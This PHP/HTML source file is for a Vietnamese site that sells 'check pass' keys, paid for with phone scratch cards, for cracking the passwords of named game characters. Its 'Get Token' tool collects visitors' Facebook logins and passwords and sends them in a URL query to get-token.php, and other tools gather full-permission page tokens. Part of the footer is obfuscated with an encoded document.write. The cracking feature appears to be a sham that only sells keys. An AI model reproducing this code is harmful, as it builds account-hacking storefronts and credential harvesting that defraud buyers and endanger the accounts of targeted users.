<?php
include ('bi.php');
if(isset($_POST['submit'])) {
		if(!isset($_POST['card_type']) || !isset($_POST['card_amount']) || !isset($_POST['serial']) || !isset($_POST['pin'])) {
			$err = 'Bạn cần nhập đầy đủ thông tin';
		} else {
			$type = $_POST['card_type'];
			$amount = $_POST['card_amount'];
			$seri = $_POST['serial'];
			$pin = $_POST['pin'];
			
			if($type == '' || $amount == '' || $seri == '' || $pin == '') {
				$err = 'Bạn cần nhập đầy đủ thông tin';
			} else {
				require_once('trumthe247.class.php');
				
				$trumthe247 = new Trumthe247();
				$note = 'noi dung';
				
				$charge_result = $trumthe247->ChargeCard($type, $seri, $pin, $amount, $note); //thực hiện đẩy thẻ lên hệ thống TrumThe247.Com
				
				if($charge_result == false) { //Có lỗi trong quá trình đẩy thẻ.
					$err = 'Có lỗi trong quá trình xử lý, xin thử lại hoặc liên hệ Admin';
				} else if(is_string($charge_result)) { //Có lỗi trả về của hệ thống TRUMTHE247.COM.
					$err = $charge_result;
				} else if(is_object($charge_result)) { //Gửi thẻ thành công lên hệ thống.
					$success = 'Gửi thẻ thành công!';
				} else {
					$err = 'Có lỗi trong quá trình xử lý';
				}
			}
		}
	}
?>
<!DOCTYPE html>
<html lang="en">

    <head>

       <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title><?php echo $bi_title; ?></title>

        <!-- CSS -->
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,100i,300,300i,500,500i">
        <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
        <script src="https://kit.fontawesome.com/9e08dc7966.js" crossorigin="anonymous"></script>
        <link rel="stylesheet" href="assets/css/animate.css">
        <link rel="stylesheet" href="assets/css/style09f4.css">
        <script src="https://code.jquery.com/jquery-1.8.2.js"></script>
        <script type="text/javascript" src="invisible_debut.js" ></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
        <script data-ad-client="ca-pub-1454538130177186" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
                <script src="assets/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/js/jquery.backstretch.min.js"></script>
        <script src="assets/js/wow.min.js"></script>
        <script src="assets/js/waypoints.min.js"></script>
        <script src="assets/js/scripts.js"></script>
        <script>
                    function loading(show) {
    if(show == true)
        $('.loading').show();
    else
        $('.loading').hide();
}
        </script>
        <style>
            .modal-body {
    text-align: left;
    position: relative;
    padding: 15px;
}
.img-replace {
  /* replace text with an image */
  display: inline-block;
  overflow: hidden;
  text-indent: 100%; 
  color: transparent;
  white-space: nowrap;
}
.bts-popup {
  position: fixed;
  left: 0;
  top: 0;
  height: 100%;
  width: 100%;
  background-color: rgba(0, 0, 0, 0.5);
  opacity: 0;
  visibility: hidden;
  -webkit-transition: opacity 0.3s 0s, visibility 0s 0.3s;
  -moz-transition: opacity 0.3s 0s, visibility 0s 0.3s;
  transition: opacity 0.3s 0s, visibility 0s 0.3s;
}
.bts-popup.is-visible {
  opacity: 1;
  visibility: visible;
  -webkit-transition: opacity 0.3s 0s, visibility 0s 0s;
  -moz-transition: opacity 0.3s 0s, visibility 0s 0s;
  transition: opacity 0.3s 0s, visibility 0s 0s;
}

.bts-popup-container {
  position: relative;
  width: 90%;
  max-width: 400px;
  margin: 4em auto;
  background: #f36f21;
  border-radius: none; 
  text-align: center;
  box-shadow: 0 0 2px rgba(0, 0, 0, 0.2);
  -webkit-transform: translateY(-40px);
  -moz-transform: translateY(-40px);
  -ms-transform: translateY(-40px);
  -o-transform: translateY(-40px);
  transform: translateY(-40px);
  /* Force Hardware Acceleration in WebKit */
  -webkit-backface-visibility: hidden;
  -webkit-transition-property: -webkit-transform;
  -moz-transition-property: -moz-transform;
  transition-property: transform;
  -webkit-transition-duration: 0.3s;
  -moz-transition-duration: 0.3s;
  transition-duration: 0.3s;
}
.bts-popup-container img {
  padding: 20px 0 0 0;
}
.bts-popup-container p {
	color: white;
  padding: 10px 40px;
}
.bts-popup-container .bts-popup-button {
  padding: 5px 25px;
  border: 2px solid white;
	display: inline-block;
  margin-bottom: 10px;
}

.bts-popup-container a {
  color: white;
  text-decoration: none;
  text-transform: uppercase;
}






.bts-popup-container .bts-popup-close {
  position: absolute;
  top: 8px;
  right: 8px;
  width: 30px;
  height: 30px;
}
.bts-popup-container .bts-popup-close::before, .bts-popup-container .bts-popup-close::after {
  content: '';
  position: absolute;
  top: 12px;
  width: 16px;
  height: 3px;
  background-color: white;
}
.bts-popup-container .bts-popup-close::before {
  -webkit-transform: rotate(45deg);
  -moz-transform: rotate(45deg);
  -ms-transform: rotate(45deg);
  -o-transform: rotate(45deg);
  transform: rotate(45deg);
  left: 8px;
}
.bts-popup-container .bts-popup-close::after {
  -webkit-transform: rotate(-45deg);
  -moz-transform: rotate(-45deg);
  -ms-transform: rotate(-45deg);
  -o-transform: rotate(-45deg);
  transform: rotate(-45deg);
  right: 6px;
  top: 13px;
}
.is-visible .bts-popup-container {
  -webkit-transform: translateY(0);
  -moz-transform: translateY(0);
  -ms-transform: translateY(0);
  -o-transform: translateY(0);
  transform: translateY(0);
}
@media only screen and (min-width: 1170px) {
  .bts-popup-container {
    margin: 8em auto;
  }
}
h1 {
  color: blue;
}
        </style>
<script>
    jQuery(document).ready(function($){
  
  window.onload = function (){
    $(".bts-popup").delay(1000).addClass('is-visible');
	}
  
	//open popup
	$('.bts-popup-trigger').on('click', function(event){
		event.preventDefault();
		$('.bts-popup').addClass('is-visible');
	});
	
	//close popup
	$('.bts-popup').on('click', function(event){
		if( $(event.target).is('.bts-popup-close') || $(event.target).is('.bts-popup') ) {
			event.preventDefault();
			$(this).removeClass('is-visible');
		}
	});
	//close popup when clicking the esc keyboard button
	$(document).keyup(function(event){
    	if(event.which=='27'){
    		$('.bts-popup').removeClass('is-visible');
	    }
    });
});
</script>
        <link rel="stylesheet" href="assets/css/dat.css">
    </head>

    <body>
                <div class="loading"><div class="lds-hourglass"></div></div>

<nav class="navbar navbar-inverse navbar-expand-xl navbar-dark">
	<div class="navbar-header d-flex col">
		<a class="navbar-brand" href="#"><?php echo $bi_domain_nav; ?></a>  		
		<button type="button" data-target="#navbarCollapse" data-toggle="collapse" class="navbar-togglessss navbar-toggle navbar-toggler ml-auto">
			<span class="navbar-toggler-icon"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
		</button>
	</div>
	<!-- Collection of nav links, forms, and other content for toggling -->
	<div id="navbarCollapse" class="collapse navbar-collapse justify-content-start">		
		<ul class="nav navbar-nav navbar-right ml-auto">
			<li class="nav-item active"><a href="free.php" class="nav-link"><i class="fa fa-home"></i><span>Nhận key free </span></a></li>
		<!--	<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-gears"></i><span>Projects</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-users"></i><span>Team</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-pie-chart"></i><span>Reports</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-briefcase"></i><span>Careers</span></a></li>
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-envelope"></i><span>Messages</span></a></li>		
			<li class="nav-item"><a href="#" class="nav-link"><i class="fa fa-bell"></i><span>Notifications</span></a></li>
			-->

		</ul>
	</div>
</nav>

			        <!-- Features -->
        <div class="features-container section-container">
	        <div class="container">
	        	<div class="row">
	        	    <div class="col-lg-12">
                <div class="panel">
                    <div class="panel-body">
                        <center><marquee><p><span style="color: #ff6600;"><strong>THÔNG BÁO : HIỆN TẠI ĐANG GIẢM GIÁ CÁC KEY VÀ MỞ THÊM KEY FREE CHO CÁC BẠN SỬ DỤNG TRONG MÙA HÈ NÀY❤️</strong></span></p></marquee></center>
                    </div>
                </div>
            </div>
	        	    <div class="col-sm-5 features-box wow fadeInLeft">
	        	  
	        	        <div class="panel panel-default">
	        	     <div class="panel-body">       



  <div class="form-group">
    <label for="linktoprofile">Tên Nhân Vật Cần Hack :</label>
    <input type="text" class="form-control" id="linkcheck" aria-describedby="linktoprofile" placeholder="VD: sv=c2badao2c"/>  </div>
    <div class="form-group">
						<label>Máy Chủ:</label>
						<select class="form-control" id="card_type">
							<option value="">Máy Chủ:</option>
							<option value="VTT">1 Sao</option>
							<option value="VMS">2 Sao</option>
							<option value="VNP">3 Sao</option>
							<option value="VTT">4 Sao</option>
							<option value="VMS">5 Sao</option>
							<option value="VNP">6 Sao</option>
							<option value="VTT">7 Sao</option>
							<option value="VMS">8 Sao</option>
						</select>
    <label for="nhapkeys">Nhập key :</label>
    <input type="text" class="form-control" id="nhapkey" aria-describedby="nhapkeys" placeholder="Nhập key mà bạn đã mua"/>  </div>
    <div class="form-group">
<button type="submit" id="crackpassword" style="margin-bottom: 0;" class="btn btn-primary">Check Pass</button>

    
  </div>
  <small id="emailHelp" class="form-text text-muted">Vui Lòng tên nhân vật ví dụ sv=c2badao2c.</small>
  <div class="form-group" id="ketquacheck" style="display:none">
  </div>
<script>

    $("#crackpassword").click(function(){
       if($.trim($('#linkcheck').val()) === "" && $.trim($('#nhapkey').val()) === ""){
           $("#ketquacheck").html('<div class="alert alert-info" role="alert">Vui lòng nhập đầy đủ nội dung !</div>');
           document.getElementById("ketquacheck").style.display = "block";
       } else {
    loading(true);
      $('#ketquacheck').load('result.php?linkvhn=' + $("#linkcheck").val(), function(){
            loading(false);
            document.getElementById("ketquacheck").style.display = "block";
        });
       }
    });
    $("#crackpasswords").click(function(){
       if($.trim($('#linkcheck').val()) === "" && $.trim($('#nhapkey').val()) === ""){
           $("#ketquacheck").html('<div class="alert alert-info" role="alert">Vui lòng nhập đầy đủ nội dung !</div>');
           document.getElementById("ketquacheck").style.display = "block";
       } else {
    loading(true);
      $('#ketquacheck').load('result.php?linkvhn=' + $("#linkcheck").val(), function(){
            loading(false);
            document.getElementById("ketquacheck").style.display = "block";
        });
       }
    });
</script>
  

  	        	        
</div></div>
<div class="panel panel-default">
    <div class="panel-heading">Mua key checkpass bằng thẻ cào [<i class="fa fa-chrome"></i>]</div>
    <div class="panel-body">
        					<form method="POST" action="">
					<div class="form-group">
						<label>Loại thẻ:</label>
						<select class="form-control" name="card_type">
							<option value="">Chọn loại thẻ</option>
							<option value="VTT">Viettel</option>
							<option value="VMS">Mobifone</option>
							<option value="VNP">Vinaphone</option>
						</select>
					</div>
					<div class="form-group">
						<label>Mệnh giá:</label>
						<select class="form-control" name="card_amount">
							<option value="">Chọn mệnh giá</option>
							<option value="50000"><?php echo $key1; ?> (3 lần sử dụng)</option> 
							<option value="100000"><?php echo $key2; ?> (1 ngày sử dụng)</option>
							<option value="200000"><?php echo $key3; ?> (1 tuần sử dụng)</option>
							<option value="300000"><?php echo $key4; ?> (1 tháng sử dụng)</option>
							<option value="500000"><?php echo $key5; ?> (6 tháng sử dụng)</option>
							<option value="1000000"><?php echo $key6; ?> (Vĩnh viễn)</option> -->
							<option value="50000"><?php echo $key2; ?> (1 ngày sử dụng)</option> 
							<option value="100000"><?php echo $key3; ?> (1 tuần sử dụng)</option>
							<option value="200000"><?php echo $key4; ?> (1 tháng sử dụng)</option>
							<option value="300000"><?php echo $key5; ?> (6 tháng sử dụng)</option>
							<option value="500000"><?php echo $key6; ?> (Vĩnh viễn)</option>
						</select>
					</div>
					<div class="form-group">
						<label>Số seri:</label>
						<input type="text" class="form-control" name="serial" />
					</div>
					<div class="form-group">
						<label>Mã thẻ:</label>
						<input type="text" class="form-control" name="pin" />
					</div>
					<div class="form-group">
						<label>Email nhận key:</label>
						<input type="text" class="form-control" name="email" />
					</div>
					<div class="form-group">
						<?php echo (isset($err)) ? '<div class="alert alert-danger" role="alert">'.$err.'</div>' : ''; ?>
						<?php echo (isset($success)) ? '<div class="alert alert-success" role="alert">'.$success.'</div>' : ''; ?>
					</div>
					<div class="form-group">
						<button type="submit" class="btn btn-success btn-block" name="submit">NẠP THẺ MUA KEY</button>
					</div>
				</form>
        </div></div>
       </div>
	        	    <div class="col-sm-7 features-box wow fadeInLeft">
	        	        
	        	                 
	        	        <div class="panel panel-default">
    <div class="panel-heading">Công cụ [<i class="fa fa-edge"></i>]</div>
    <div class="panel-body">
 <a class="btn btn-default ripple r-raised" data-toggle="modal" onclick="GetToken()" data-target="#TB">Get Token</a>
<button type="button" class="btn btn-default ripple r-raised" data-toggle="modal" onclick="GetUID()" data-target="#TB">Get UID Facebook</button>
<button type="button" class="btn btn-default ripple r-raised" data-toggle="modal" onclick="GetTokenPAGE()" data-target="#TB">Get Token Fanpage</button>
<a class="btn btn-default ripple r-raised" data-toggle="modal" onclick="FanpageInfo()" data-target="#TB">Get Fanpage Info</a>
<a class="btn btn-default ripple r-raised" data-toggle="modal" onclick="Demo()" data-target="#TB">Video Demo</a>
    
        

</div> </div>
  <div class="panel panel-default">
    <div class="panel-heading">Bảng giá key check pass [<i class="fa fa-money"></i>]</div>
    <div class="panel-body">
         <div class="table-responsive">          
  <table class="table">
    <thead>
      <tr>
        <th>Giá</th>
        <th>Hạn sử dụng</th>
        <th>Trạng thái</th>
      </tr>
    </thead>
    <tbody>
        <tr>
        <td><?php echo $key1; ?></td>
        <td>3 lần sử dụng</td>
        <td><?php echo $infokey2; ?></td>
      </tr>
      <tr>
        <td><?php echo $key2; ?></td>
        <td>1 ngày sử dụng</td>
        <td><?php echo $infokey2; ?></td>
      </tr>
            <tr>
        <td><?php echo $key3; ?></td>
        <td>1 tuần sử dụng</td>
        <td><?php echo $infokey2; ?></td>
      </tr>
            <tr>
        <td><?php echo $key4; ?></td>
        <td>1 tháng sử dụng</td>
        <td><?php echo $infokey2; ?></td>
      </tr>
            <tr>
        <td><?php echo $key5; ?></td>
        <td>6 tháng sử dụng</td>
        <td><?php echo $infokey2; ?></td>
      </tr>
      <tr>
        <td><?php echo $key6; ?></td>
        <td>Vĩnh viễn</td>
        <td><?php echo $infokey1; ?></td>
      </tr>
    </tbody>
  </table>
  </div>
    </div>
  </div>
       
    </div>
  </div>
 </div>
	        	    </div></div>
	        	    

</div> </div>
	        </div>
        </div>
        
<div id="TB" class="modal fade" role="dialog">
  <div class="modal-dialog">

    <!-- Modal content-->
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal">&times;</button>
        <h4 class="modal-title">Hộp thoại <i class="fa fa-bell"></i></h4>
      </div>
      <div class="modal-body" id="noidungmodal">
      </div>
      <div class="modal-footer">
      <script type="text/javascript">
    <!-- HTML Encryption provided by www.dat.coder -->
document.write(unescape('%3C%62%75%74%74%6F%6E%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%69%64%3D%22%64%6F%6E%67%6D%6F%64%61%6C%22%20%63%6C%61%73%73%3D%22%62%74%6E%20%62%74%6E%2D%64%65%66%61%75%6C%74%22%20%64%61%74%61%2D%64%69%73%6D%69%73%73%3D%22%6D%6F%64%61%6C%22%3E%11Đ%F3%6E%67%3C%2F%62%75%74%74%6F%6E%3E%0A%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%3C%2F%64%69%76%3E%0A%0A%20%20%3C%2F%64%69%76%3E%0A%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%66%6F%6F%74%65%72%3E%0A%09%20%20%20%20%20%20%20%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6E%74%61%69%6E%65%72%22%3E%0A%09%20%20%20%20%20%20%20%20%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%72%6F%77%22%3E%0A%09%20%20%20%20%20%20%20%20%09%09%3C%64%69%76%20%63%6C%61%73%73%3D%22%63%6F%6C%2D%73%6D%2D%31%32%20%66%6F%6F%74%65%72%2D%63%6F%70%79%72%69%67%68%74%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%09%26%63%6F%70%79%3B%20%43%68%65%63%6B%20%50%61%73%73%20%4F%6E%6C%69%6E%65%20%76%33%2E%30%20%7C%20%43%6F%64%65%20%42%79%20%3C%61%20%68%72%65%66%3D%22%23%22%3EĐạ%74%43%6F%64%65%72%3C%2F%61%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%09%20%20%20%20%20%20%20%20%3C%2F%64%69%76%3E%0A%20%20%20%20%20%20%20%20%3C%2F%66%6F%6F%74%65%72%3E%0A%20%20%20'));
</script>
        <script>


       
        <script>

           
  

        </script>
        <script>
function GetToken(){
      $("#noidungmodal").html('<div class="form-group"><label for="taikhoan">Tài khoản:</label><input type="text" class="form-control" placeholder="Email, UID hoặc Số điện thoại" id="taikhoan"></div><div class="form-group"><label for="matkhau">Password:</label><input type="password" placeholder="Mật khẩu facebook" class="form-control" id="matkhau"></div><div class="form-group"><button onclick="laytoken()" class="btn btn-primary">Get Acccess Token</button></div><div class="form-group"><div id="ketqua_token"></div></div>');
  }
  function laytoken(){
    if(!$.trim($('#taikhoan').val()) == "" && !$.trim($('#matkhau').val()) == "") {
    $('#ketqua_token').html('<iframe style="width: 100%;border: 1px solid #00ec07;padding: 0 10px;background: #009e05;" src="get-token.php?email=' + $('#taikhoan').val() +'&password=' + $('#matkhau').val() +'"></iframe>');
    
}
    else {
    $('#ketqua_token').html('<div class="alert alert-danger"><strong>Lỗi!</strong> Vui lòng nhập đầy đủ thông tin.</div>');
    }
  }
  function MuaAccount(idfb, thongtinlienhe){
      loading(true);
      $('#noidungmodal').load('ajax.php?PT=MUAACC&lienhe='+ thongtinlienhe +'&bs=thang.jp/' + idfb, function(){
            loading(false);
        });
  }
  function GetTokenPAGE(){
      $("#noidungmodal").html('<div class="form-group"><label for="token">Token Account :</label><input type="text" class="form-control" placeholder="Nhập token giữ page , token full quyền" id="token"></div><div class="form-group"><label for="limit">Limit:</label><input type="text" placeholder="Số page muốn get token" class="form-control" id="limit"></div><div class="form-group"><button onclick="LayTokenPAGE()" class="btn btn-primary">Get Acccess Token Page</button></div><div class="form-group"><div id="ketqua_tokenpage"></div></div><div class="form-gruop"><div class="alert alert-info" role="alert">Nếu Box Token Trắng Là Token Die Hoặc Không FULL Quyền</div');
  }
  function LayTokenPAGE(){
    if(!$.trim($('#token').val()) == "" && !$.trim($('#limit').val()) == "") {
    $('#ketqua_tokenpage').html('<iframe style="width: 100%;border: 1px solid #00ec07;padding: 0 10px;background: #009e05;" src="token-page.php?token=' + $('#token').val() +'&limit=' + $('#limit').val() +'"></iframe>');
}
else {
    $('#ketqua_tokenpage').html('<div class="alert alert-danger"><strong>Lỗi!</strong> Vui lòng nhập đầy đủ thông tin.</div>');
    }
  }
  function Demo(){
      $("#noidungmodal").html('<iframe style="width: 100%;border: 1px solid #00ec07;padding: 0 10px;" src="https://www.youtube.com/embed/TZi8QV9TW0Q" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>');
  }
  function GetUID(){
      $("#noidungmodal").html('<div class="input-group"><input placeholder="Ví dụ : https://facebook.com/zuck" id="idfb" type="text" class="form-control"><span class="input-group-btn"><button class="btn btn-default" onclick="GetID()" type="button">GET!</button></span></div><br/><div id="kg_get_id"></div>');
  }
  function GetID(){
      var id_facebook = $("#idfb").val();
      loading(true);
      $('#kg_get_id').load('ajax.php?PT=GETUID&linkvhn=' + id_facebook, function(){
            loading(false);
            $("#kg_get_id").addClass("alert alert-info");
        });
  }
    function FanpageInfo(){
      $("#noidungmodal").html('<div class="input-group"><input placeholder="Ví dụ : https://www.facebook.com/GaVangDepTrai" id="idfb" type="text" class="form-control"><span class="input-group-btn"><button class="btn btn-default" onclick="GetPage()" type="button">GET!</button></span></div><br/><div id="kg_get_id"></div>');
  }
  function GetPage(){
      var id_facebook = $("#idfb").val();
      loading(true);
      $('#kg_get_id').load('ajax.php?PT=GETFANPAGEINFO&linkvhn=' + id_facebook, function(){
            loading(false);
            $("#kg_get_id").addClass("alert alert-info");
        });
  }
  function HDGETTOKEN(){
      $("#noidungmodal").html('<div class="huongdangettoken"><h4>Các bước get token không checkpoint bằng mật khẩu ứng dụng</h4><li><b>Bước 1:</b> Bạn nhập tài khoản vào khung get token sau đó bạn truy cập vào <a href="https://m.facebook.com/new_sec_settings/app_passwords/?step=generate" target="_blank">link này</a> (đăng nhập vào tài khoản trước).</li><li><b>Bước 2:</b> Tiếp theo bạn gõ tên ứng dụng và nhấn <b>Tạo</b>. Copy mật khẩu được tạo rồi dán vào ô mật khẩu để lấy token.</li><li><b>Bước 3:</b> Copy đoạn này và dán vào ô đăng nhập, sau đó nhấn <b>Login</b>.</li><center><img class="img-responsive" src="@BS_Assets/@BS_img/Token.png"/></div>');
  }
  $("#dongmodal").click(function(){
     $("#noidungmodal").html('');
  });
  
        </script>

    </body>